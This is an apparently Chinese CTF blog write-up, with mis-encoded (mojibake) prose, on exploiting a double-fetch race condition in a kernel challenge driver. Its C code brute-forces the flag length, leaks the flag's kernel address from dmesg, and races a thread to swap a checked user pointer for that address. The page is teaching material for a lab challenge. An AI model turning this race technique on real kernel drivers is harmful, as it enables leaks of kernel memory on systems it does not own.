<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>kernel_Double_Fetchè¯¦è§£ | starssgo</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><meta name="generator" content="Hexo 4.0.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">kernel_Double_Fetchè¯¦è§£</h1><a id="logo" href="/.">starssgo</a><p class="description">è¶ŠåŠªåŠ›,è¶Šå¹¸è¿ã€‚</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">kernel_Double_Fetchè¯¦è§£</h1><div class="post-meta">Apr 30, 2020<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><a class="disqus-comment-count" href="/2020/04/30/kernel-%C2%96%C2%96D-ublele-Fetch%E8%AF%A6%E8%A7%A3/#vcomment"><span class="valine-comment-count" data-xid="/2020/04/30/kernel-%C2%96%C2%96D-ublele-Fetch%E8%AF%A6%E8%A7%A3/"></span><span> Comment</span></a><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#æ¡ä»¶ç«äº‰çš„æ¡ä»¶"><span class="toc-number">1.</span> <span class="toc-text">æ¡ä»¶ç«äº‰çš„æ¡ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#demoæµ‹è¯•"><span class="toc-number">2.</span> <span class="toc-text">demoæµ‹è¯•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ä¾‹é¢˜"><span class="toc-number">3.</span> <span class="toc-text">ä¾‹é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ç¨‹åºåˆ†æ"><span class="toc-number">3.1.</span> <span class="toc-text">ç¨‹åºåˆ†æ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#æ¼æ´å¯»æ‰¾"><span class="toc-number">3.2.</span> <span class="toc-text">æ¼æ´å¯»æ‰¾</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#æ³„éœ²len"><span class="toc-number">3.3.</span> <span class="toc-text">æ³„éœ²len</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#å¾—åˆ°flagåœ°å€"><span class="toc-number">3.4.</span> <span class="toc-text">å¾—åˆ°flagåœ°å€</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#æŒŸæŒbuf"><span class="toc-number">3.5.</span> <span class="toc-text">æŒŸæŒbuf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">3.6.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#æ€»ç»“"><span class="toc-number">4.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol></div></div><div class="post-content"><p>Double_Fetchæœ¬è´¨ä¸Šæ˜¯ä¸€ç§æ¡ä»¶ç«äº‰æ¼æ´ï¼Œå½“ç³»ç»Ÿé‡‡ç”¨å¹¶å‘ç¼–ç¨‹ï¼Œç»å¸¸å¯¹èµ„æºè¿›è¡Œå…±äº«æ—¶ï¼Œå¾€å¾€ä¼šå‡ºç°æ¡ä»¶ç«äº‰æ¼æ´ã€‚</p>
<a id="more"></a>  

<h3 id="æ¡ä»¶ç«äº‰çš„æ¡ä»¶"><a href="#æ¡ä»¶ç«äº‰çš„æ¡ä»¶" class="headerlink" title="æ¡ä»¶ç«äº‰çš„æ¡ä»¶"></a>æ¡ä»¶ç«äº‰çš„æ¡ä»¶</h3><p>æˆ‘ä»¬ä»¥è®¡ç®—æœºç¨‹åºæ–¹é¢çš„æ¡ä»¶ç«äº‰æ¥ä¸¾ä¾‹ï¼Œå½“ä¸€ä¸ªè½¯ä»¶çš„è¿è¡Œç»“æœä¾èµ–äºè¿›ç¨‹æˆ–è€…çº¿ç¨‹çš„é¡ºåºæ—¶ï¼Œå°±å¯èƒ½ä¼šå‡ºç°æ¡ä»¶ç«äº‰ã€‚ç»¼åˆè€ƒè™‘ä¸‹ï¼Œæ¡ä»¶ç«äº‰éœ€è¦çš„æ¡ä»¶å¦‚ä¸‹ã€‚  </p>
<blockquote>
<p>1.å¹¶å‘ï¼Œå³è‡³å°‘å­˜åœ¨ä¸¤ä¸ªå¹¶å‘æ‰§è¡Œæµã€‚è¿™é‡Œçš„æ‰§è¡ŒæµåŒ…æ‹¬çº¿ç¨‹ï¼Œè¿›ç¨‹ï¼Œä»»åŠ¡ç­‰çº§åˆ«çš„æ‰§è¡Œæµã€‚<br>2.å…±äº«å¯¹è±¡ï¼Œå³å¤šä¸ªå¹¶å‘æµä¼šè®¿é—®åŒä¸€å¯¹è±¡ã€‚å¸¸è§çš„å…±äº«å¯¹è±¡æœ‰å…±äº«å†…å­˜ï¼Œæ–‡ä»¶ç³»ç»Ÿï¼Œä¿¡å·ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œè¿™äº›å…±äº«å¯¹è±¡æ˜¯ç”¨æ¥ä½¿å¾—å¤šä¸ªç¨‹åºæ‰§è¡Œæµç›¸äº’äº¤æµã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ç§°è®¿é—®å…±äº«å¯¹è±¡çš„ä»£ç ä¸ºä¸´ç•ŒåŒºã€‚åœ¨æ­£å¸¸å†™ä»£ç æ—¶ï¼Œè¿™éƒ¨åˆ†åº”è¯¥åŠ é”ã€‚<br>3.æ”¹å˜å¯¹è±¡ï¼Œå³è‡³å°‘æœ‰ä¸€ä¸ªæ§åˆ¶æµä¼šæ”¹å˜ç«äº‰å¯¹è±¡çš„çŠ¶æ€ã€‚å› ä¸ºå¦‚æœç¨‹åºåªæ˜¯å¯¹å¯¹è±¡è¿›è¡Œè¯»æ“ä½œï¼Œé‚£ä¹ˆå¹¶ä¸ä¼šäº§ç”Ÿæ¡ä»¶ç«äº‰ã€‚  </p>
</blockquote>
<p>æ¡ä»¶ç«äº‰é€ æˆçš„å½±å“ä¹Ÿæ˜¯å¤šæ ·çš„ï¼Œè½»åˆ™ç¨‹åºå¼‚å¸¸æ‰§è¡Œï¼Œé‡åˆ™ç¨‹åºå´©æºƒã€‚å¦‚æœæ¡ä»¶ç«äº‰æ¼æ´è¢«æ”»å‡»è€…åˆ©ç”¨çš„è¯ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šä½¿å¾—æ”»å‡»è€…è·å¾—ç›¸åº”ç³»ç»Ÿçš„ç‰¹æƒã€‚</p>
<h3 id="demoæµ‹è¯•"><a href="#demoæµ‹è¯•" class="headerlink" title="demoæµ‹è¯•"></a>demoæµ‹è¯•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int counter=0;</span><br><span class="line">int hook=1;</span><br><span class="line">void *IncreaseCounter(void *args) &#123;</span><br><span class="line">	printf(&quot;IncreaseCounter_NULL_counter=%d\n&quot;,counter);</span><br><span class="line">  	counter+=1;</span><br><span class="line">	sleep(0.1);</span><br><span class="line">	printf(&quot;IncreaseCounter_counter=%d\n&quot;,counter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  pthread_t p[10];</span><br><span class="line">    for (int i = 0; i &lt; 10; ++i) &#123;</span><br><span class="line">	printf(&quot;for %d =%d\n&quot;,i,counter);</span><br><span class="line">	  pthread_create(&amp;p[i], NULL, IncreaseCounter, NULL);</span><br><span class="line">  &#125;</span><br><span class="line">      for (int i = 0; i &lt; 10; ++i) &#123;</span><br><span class="line">	  pthread_join(p[i], NULL);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘å‘½ä»¤<code>gcc poc.c -o poc -static -w -pthread</code><br>æˆ‘ä»¬æœ¬è¯¥çš„è¿è¡Œç»“æœä¸ºï¼š  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">starssgo@ubuntu:~/CTF/æ¡ä»¶ç«äº‰$ ./poc</span><br><span class="line">for 0 =0</span><br><span class="line">for 1 =0</span><br><span class="line">for 2 =0</span><br><span class="line">for 3 =0</span><br><span class="line">for 4 =0</span><br><span class="line">for 5 =0</span><br><span class="line">for 6 =0</span><br><span class="line">for 7 =0</span><br><span class="line">for 8 =0</span><br><span class="line">for 9 =0</span><br><span class="line">IncreaseCounter_NULL_counter=0</span><br><span class="line">IncreaseCounter_counter=1</span><br><span class="line">IncreaseCounter_NULL_counter=1</span><br><span class="line">IncreaseCounter_counter=2</span><br><span class="line">IncreaseCounter_NULL_counter=2</span><br><span class="line">IncreaseCounter_counter=3</span><br><span class="line">IncreaseCounter_NULL_counter=3</span><br><span class="line">IncreaseCounter_counter=4</span><br><span class="line">IncreaseCounter_NULL_counter=4</span><br><span class="line">IncreaseCounter_counter=5</span><br><span class="line">IncreaseCounter_NULL_counter=5</span><br><span class="line">IncreaseCounter_counter=6</span><br><span class="line">IncreaseCounter_NULL_counter=6</span><br><span class="line">IncreaseCounter_counter=7</span><br><span class="line">IncreaseCounter_NULL_counter=7</span><br><span class="line">IncreaseCounter_counter=8</span><br><span class="line">IncreaseCounter_NULL_counter=8</span><br><span class="line">IncreaseCounter_counter=9</span><br><span class="line">IncreaseCounter_NULL_counter=9</span><br><span class="line">IncreaseCounter_counter=10</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯ï¼Œæˆ‘ä»¬åœ¨<code>IncreaseCounter</code>å‡½æ•°ä¸­åŠ å…¥äº†<code>sleep(0.5)</code>åï¼Œç»“æœå´ä¸ä¸€æ ·äº†:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">starssgo@ubuntu:~/CTF/æ¡ä»¶ç«äº‰$ ./poc</span><br><span class="line">for 0 =0</span><br><span class="line">for 1 =0</span><br><span class="line">for 2 =0</span><br><span class="line">for 3 =0</span><br><span class="line">for 4 =0</span><br><span class="line">for 5 =0</span><br><span class="line">for 6 =0</span><br><span class="line">for 7 =0</span><br><span class="line">for 8 =0</span><br><span class="line">for 9 =0</span><br><span class="line">IncreaseCounter_NULL_counter=0</span><br><span class="line">IncreaseCounter_NULL_counter=1</span><br><span class="line">IncreaseCounter_NULL_counter=2</span><br><span class="line">IncreaseCounter_NULL_counter=3</span><br><span class="line">IncreaseCounter_NULL_counter=4</span><br><span class="line">IncreaseCounter_NULL_counter=5</span><br><span class="line">IncreaseCounter_NULL_counter=6</span><br><span class="line">IncreaseCounter_counter=6</span><br><span class="line">IncreaseCounter_counter=6</span><br><span class="line">IncreaseCounter_counter=6</span><br><span class="line">IncreaseCounter_counter=6</span><br><span class="line">IncreaseCounter_counter=6</span><br><span class="line">IncreaseCounter_counter=6</span><br><span class="line">IncreaseCounter_NULL_counter=7</span><br><span class="line">IncreaseCounter_NULL_counter=8</span><br><span class="line">IncreaseCounter_NULL_counter=9</span><br><span class="line">IncreaseCounter_counter=10</span><br><span class="line">IncreaseCounter_counter=10</span><br><span class="line">IncreaseCounter_counter=10</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œç¬¬ä¸€ä¸ªçº¿ç¨‹p[0]åœ¨sleep(0.5)æ—¶ï¼Œå…¶ä»–çš„çº¿ç¨‹å´æ²¡æœ‰é—²ç½®ï¼Œä¾ç„¶è¿›è¡Œç€<code>counter+=1;</code>çš„æ“ä½œ,å‡ºç°äº†æ¡ä»¶ç«äº‰<br>ç„¶è€Œåœ¨å®é™…å¤šçº¿ç¨‹å¼€å‘ä¸­,ä¸€äº›å¿…è¦çš„å¾ªç¯å’Œè®¡ç®—å°†è€—è´¹ç¨‹åºçš„æ—¶é—´ã€‚é‚£ä¹ˆå¦‚æœæ²¡æœ‰åšä¿æŠ¤çš„æƒ…å†µä¸‹ï¼Œç¨‹åºå°±å®¹æ˜“å‘ç”Ÿbugï¼Œå¹¶ä¸”åœ¨å¹¶å‘æ—¶ï¼Œæ‰§è¡Œæµçš„ä¸ç¡®å®šæ€§å¾ˆå¤§ï¼Œæ¡ä»¶ç«äº‰ç›¸å¯¹éš¾å¯Ÿè§‰ï¼Œå¹¶ä¸”åœ¨å¤ç°å’Œè°ƒè¯•æ–¹é¢ä¼šæ¯”è¾ƒå›°éš¾ã€‚è¿™ç»™ä¿®å¤æ¡ä»¶ç«äº‰ä¹Ÿå¸¦æ¥äº†ä¸å°çš„å›°éš¾ã€‚</p>
<h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><p><a href="https://github.com/Starssgo/ctf-challenges/tree/master/level3" target="_blank" rel="noopener">ç¨‹åºåœ°å€</a>  </p>
<h4 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h4><p>æœ¬é©±åŠ¨æœ‰ä¸¤ä¸ªæ¨¡å—ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ‰“å°flagçš„å†…æ ¸åœ°å€</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( (_DWORD)a2 == 0x6666 )</span><br><span class="line"> &#123;</span><br><span class="line">   printk(&quot;Your flag is at %px! But I don&apos;t think you know it&apos;s content\n&quot;, flag);</span><br><span class="line">   result = 0LL;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒä¸ªæ˜¯æ»¡è¶³ç‰¹å®šæ¡ä»¶åï¼Œå°†v5åœ°å€æŒ‡å‘çš„å€¼ä¸flagè¿›è¡Œç›¸ç­‰åˆ¤æ–­ã€‚å¦‚æœå…¨éƒ¨ç›¸ç­‰ï¼Œæ‰“å°flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">else if ( (_DWORD)a2 == 0x1337</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(v2, 16LL, *(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 0x1358))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               *(_QWORD *)v5,</span><br><span class="line">               *(signed int *)(v5 + 8),</span><br><span class="line">               *(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 0x1358))</span><br><span class="line">         &amp;&amp; *(_DWORD *)(v5 + 8) == strlen(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt; strlen(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )</span><br><span class="line">        return 22LL;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;, flag);</span><br><span class="line">    result = 0LL;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œç”¨åˆ°äº†<code>_chk_range_not_ok</code>,è§‚å¯Ÿå…¶å®šä¹‰ï¼š  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bool __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, unsigned __int64 a3)</span><br><span class="line">  v3 = __CFADD__(a2, a1);</span><br><span class="line">  v4 = a2 + a1;</span><br><span class="line">  if ( v3 )</span><br><span class="line">    result = 1;</span><br><span class="line">  else</span><br><span class="line">    result = a3 &lt; v4;</span><br><span class="line">  return result;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹å‡ºï¼Œå½“a1+a2å°äºa3æ—¶ï¼Œæ¡ä»¶æ»¡è¶³ã€‚<br>v2ä¸º<code>baby_ioctl</code>çš„ç¬¬ä¸‰ä¸ªå‚æ•°(rdx=v2)ã€‚<br>åŠ¨è°ƒä¸­å‘ç°*(_QWORD *)(__readgsqword((unsigned __int64)&amp;current_task) + 0x1358)ä¸ºå†…æ ¸åœ°å€<br>ç”±æ­¤åˆ†ææ¡ä»¶è¦æ±‚ï¼š</p>
<blockquote>
<p>v2ä¸ºç”¨æˆ·åœ°å€ã€‚<br>v2ä¸v2+8çš„æŒ‡é’ˆä¸ºç”¨æˆ·åœ°å€<br>v2+8ä¸ºflagçš„é•¿åº¦<br>ç”±ä¸‹é¢<code>if ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )</code>ä¸éš¾å¾—å‡ºv2ä¸ºä¸€ä¸ªç»“æ„ä½“.  </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct message&#123;</span><br><span class="line">    char * buf;</span><br><span class="line">    long len;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­bufå­˜æ”¾ç€ç”¨æˆ·å±‚flagçš„åœ°å€ï¼Œlenå­˜æ”¾ç€å†…æ ¸å±‚flagçš„é•¿åº¦ã€‚  </p>
<h4 id="æ¼æ´å¯»æ‰¾"><a href="#æ¼æ´å¯»æ‰¾" class="headerlink" title="æ¼æ´å¯»æ‰¾"></a>æ¼æ´å¯»æ‰¾</h4><p>æˆ‘ä»¬å¯ä»¥å°è¯•åœ¨ç»•è¿‡<code>else if ( (_DWORD)a2 == 0x1337</code>æ£€æŸ¥åï¼Œå°†bufçš„æŒ‡é’ˆé€šè¿‡æ¡ä»¶ç«äº‰çš„æ–¹å¼æ›´æ”¹ä¸ºå†…æ ¸flagçš„åœ°å€ã€‚<br>è¿™æ ·<code>if ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )</code>å…¶å®å°±æ˜¯å†…æ ¸flagè‡ªå·±ä¸è‡ªå·±åˆ¤æ–­,ç„¶åå†…æ ¸æ‰“å°å‡ºflagçš„å€¼.<br>æ‰€ä»¥æˆ‘ä»¬æ‹¿åˆ°flagçš„æ­¥éª¤ä¸º:  </p>
<blockquote>
<p>1.é€šè¿‡ä¸åŒçš„retnæ¥æ‰¾åˆ°flagçš„é•¿åº¦(æœ¬åœ°å¯ä»¥IDAæ‰¾å‡º,ä½†æ˜¯æœåŠ¡å™¨ç«¯éœ€è¦è‡ªå·±æ‰¾)<br>2.å¾—åˆ°flagçš„å†…æ ¸åœ°å€<br>3.é€šè¿‡å¤šçº¿ç¨‹å®ç°bufæŒ‡é’ˆçš„åŠ«æŒ,ç»•è¿‡æ£€æµ‹.<br>4.é€šè¿‡dmesgæŸ¥æ‰¾å‡ºå†…æ ¸æ‰“å°åˆ°å†…æ ¸ç¼“å†²åŒºçš„flag</p>
</blockquote>
<h4 id="æ³„éœ²len"><a href="#æ³„éœ²len" class="headerlink" title="æ³„éœ²len"></a>æ³„éœ²len</h4><p>å¦‚å†…æ ¸åˆ†æ,å½“lené”™è¯¯æ—¶retn 0xe,å½“lenæ­£ç¡®ä¸”bufæŒ‡å‘çš„å€¼ä¸ç­‰äºflagæ—¶,retn 0x16,åˆ™æ³„éœ²è„šæœ¬:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#define MAX_LEN 0x40</span><br><span class="line">struct info</span><br><span class="line">&#123;</span><br><span class="line">    char *msg;</span><br><span class="line">    size_t len;</span><br><span class="line">&#125;;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int fd = open(&quot;/dev/baby&quot;, 0);</span><br><span class="line">    int rret;</span><br><span class="line">    struct info myinfo;</span><br><span class="line">    myinfo.msg = &quot;qq&quot;;</span><br><span class="line">    myinfo.len = 0;</span><br><span class="line">    for (int i=0;i&lt;MAX_LEN;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        myinfo.len = i;</span><br><span class="line">        rret = ioctl(fd, 0x1337, &amp;myinfo);</span><br><span class="line">        printf (&quot;return : %d\n&quot;, rret);</span><br><span class="line">        if (rret == 0x16)</span><br><span class="line">            printf (&quot;get flag len : %d\n&quot;, i);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/04/30/kernel-%C2%96%C2%96D-ublele-Fetch%E8%AF%A6%E8%A7%A3/1.jpg" alt><br>å¯ä»¥å¾—åˆ°,flag lençš„é•¿åº¦ä¸º33.</p>
<h4 id="å¾—åˆ°flagåœ°å€"><a href="#å¾—åˆ°flagåœ°å€" class="headerlink" title="å¾—åˆ°flagåœ°å€"></a>å¾—åˆ°flagåœ°å€</h4><p><code>printk</code>å‡½æ•°å°†æµæ‰“å°åˆ°å†…æ ¸ç¼“å†²åŒº.Liunxä¸‹å¯ä»¥é€šè¿‡dmesgå‘½ä»¤æ¥æŸ¥çœ‹.<br>ç»¼åˆæ³„éœ²flagåœ°å€çš„è„šæœ¬:  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   system(&quot;dmesg &gt; /tmp/record.txt&quot;); //å°†dmesgæ‰“å°çš„å­—ç¬¦ä¸²å­˜å…¥record</span><br><span class="line">   int tmp_fd = open(&quot;/tmp/record.txt&quot;,O_RDONLY); //æ‰“å¼€record</span><br><span class="line">   char temp[0x1000];   </span><br><span class="line">   lseek(tmp_fd,-0x100,SEEK_END);  //å°†æŒ‡é’ˆè¯»å†™ä½ç½®ç§»åˆ°-0x100å¤„</span><br><span class="line">   read(tmp_fd,temp,0x100);  //ä»recordæµä¸­è¯»å–0x100å­—èŠ‚</span><br><span class="line">   char * idx = strstr(temp,&quot;Your flag is at &quot;); //å°†æŒ‡é’ˆæŒ‡å‘Your flag is at å­—ç¬¦ä¸²é¦–</span><br><span class="line">   if (idx == 0)&#123;</span><br><span class="line">       printf(&quot;[-]Not found addr&quot;);</span><br><span class="line">       exit(-1);</span><br><span class="line">   &#125;</span><br><span class="line">close(tmp_fd);</span><br><span class="line">   idx+=16; //å°†æŒ‡é’ˆæŒ‡å‘flagåœ°å€å­—ç¬¦ä¸²å¤„</span><br><span class="line">   unsigned long addr = strtoull(idx,idx+16,16);  //å–å‡ºåœ°å€</span><br></pre></td></tr></table></figure>
<h4 id="æŒŸæŒbuf"><a href="#æŒŸæŒbuf" class="headerlink" title="æŒŸæŒbuf"></a>æŒŸæŒbuf</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int finish=0;</span><br><span class="line">void change_attr_value(unsigned long addr)&#123;</span><br><span class="line">    while(finish==0)&#123;</span><br><span class="line">	puts(&quot;changing&quot;);</span><br><span class="line">    my_message.buf = addr;  //å°†bufæ”¹ä¸ºflagå†…æ ¸åœ°å€</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">char temp[0x1000];</span><br><span class="line">my_message.buf = temp;//é¦–å…ˆå°†bufæŒ‡é’ˆæŒ‡å‘ç”¨æˆ·ç©ºé—´.ç»•è¿‡æ£€æµ‹</span><br><span class="line">my_message.len = 33; //å°†lenè®¾ç½®ä¸ºflagçš„é•¿åº¦</span><br><span class="line">pthread_t t1;</span><br><span class="line">pthread_create(&amp;t1,NULL,change_attr_value,addr); //å¼€ç¬¬äºŒçº¿ç¨‹,è°ƒç”¨change_attr_valueå‡½æ•°</span><br><span class="line">for (int i = 0 ; i &lt; 3000; i++)&#123;</span><br><span class="line">	my_message.buf = temp;</span><br><span class="line">	ioctl(fd,0x1337,&amp;my_message);   //ç¬¬ä¸€çº¿ç¨‹ä¸åœè°ƒç”¨0x1337æ¨¡å—</span><br><span class="line">&#125;</span><br><span class="line">	finish = 1; </span><br><span class="line">	system(&quot;dmesg | grep THIS&quot;); //å¾ªç¯ç»“æŸ,å°†finishè®¾ç½®ä¸º1æ¨å‡ºç¬¬äºŒçº¿ç¨‹.åœ¨å†…æ ¸ç¼“å†²åŒºå¯»æ‰¾flag</span><br></pre></td></tr></table></figure>
